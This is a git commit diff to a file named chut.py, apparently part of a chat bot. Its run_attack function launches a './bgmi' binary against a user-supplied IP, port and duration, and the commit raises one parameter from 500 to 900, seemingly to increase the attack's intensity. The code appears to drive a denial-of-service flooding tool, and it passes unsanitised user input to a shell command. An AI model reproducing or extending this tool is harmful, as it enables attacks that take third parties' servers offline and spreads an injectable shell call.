6e66f993bf3cf843fb825ec625e291ba7f347bec
kahvahaajnn <Laudahab6362@outlook.com>
2025-02-06 12:08:52 +0530

    Update chut.py

--- chut.py
+++ chut.py
@@ -100,7 +100,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 500",
+            f"./bgmi {ip} {port} {time} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
